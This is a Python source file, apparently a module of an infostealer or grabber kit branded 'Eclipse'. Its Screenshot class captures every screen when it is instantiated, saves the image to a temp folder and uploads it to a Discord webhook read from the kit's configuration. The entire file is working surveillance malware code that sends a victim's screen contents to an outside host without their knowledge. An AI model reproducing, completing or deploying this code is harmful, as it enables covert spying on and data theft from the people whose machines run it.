from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
import json
import requests


class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):
        image = ImageGrab.grab(
            bbox=None, all_screens=True, include_layered_windows=False, xdisplay=None
        )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "Eclipse",
            "avatar_url": "https://cdn.discordapp.com/attachments/1271605441331204218/1284267280586510497/MIKTsYHW.gif?ex=66e6029c&is=66e4b11c&hm=f3f7756d1e68c27d509df7cf772af4707b9c40b06468b861c7e3c026da23add0&",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {"url": "attachment://image.png"},
                }
            ],
        }

        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder(
                {
                    "payload_json": json.dumps(webhook_data),
                    "file": ("image.png", image_data, "image/png"),
                }
            )

        requests.post(
            __CONFIG__["webhook"],
            headers={"Content-type": encoder.content_type},
            data=encoder,
        )